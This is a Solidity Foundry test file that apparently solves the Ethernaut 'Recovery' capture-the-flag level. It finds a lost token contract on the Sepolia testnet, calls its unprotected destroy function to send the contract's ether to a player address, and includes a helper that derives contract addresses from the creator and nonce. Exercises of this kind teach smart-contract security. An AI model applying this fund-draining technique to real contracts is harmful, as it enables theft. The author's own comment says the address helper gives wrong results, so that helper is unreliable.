// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {SimpleToken} from "../src/Recovery.sol";

contract RecoveryTest is Test {
    function testRecovery() public {
        address player = makeAddr("player");
        // 通过分析交易，得到token的地址
        // https://sepolia.etherscan.io/tx/0x4863274e176ea2a894b8698b24eab52f05f070483acd37ca2688c70ea33389ef/advanced
        SimpleToken token = SimpleToken(payable(0xd8F80bC0532718F61796ABf2D47D8d2d7c461969));
        console.log(address(token).balance);
        token.destroy(payable(player));
        console.log(address(token).balance);
        console.log(player.balance);
    }

    function testAddressFrom() public {
        // 计算结果不对
        console.log(addressFrom(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6, 112));
        console.log(addressFrom(0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048, 112));
        console.log(addressFrom(0x289cf68B55eb39189e100d96B8E227E20F1ca387, 112));
        console.log(addressFrom(0x57d122d0355973dA78acF5138aE664548bB2CA2b, 112));
        console.log(addressFrom(0xaCab087f7f0977c31d68E8BAe117069a90Dc6574, 111));
    }

    function addressFrom(address _origin, uint _nonce) public pure returns (address) {
        bytes memory data;
        if (_nonce == 0x00)          data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x80));
        else if (_nonce <= 0x7f)     data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, uint8(_nonce));
        else if (_nonce <= 0xff)     data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), _origin, bytes1(0x81), uint8(_nonce));
        else if (_nonce <= 0xffff)   data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), _origin, bytes1(0x82), uint16(_nonce));
        else if (_nonce <= 0xffffff) data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), _origin, bytes1(0x83), uint24(_nonce));
        else                         data = abi.encodePacked(bytes1(0xda), bytes1(0x94), _origin, bytes1(0x84), uint32(_nonce));
        return address(uint160(uint256(keccak256(data))));
    }
}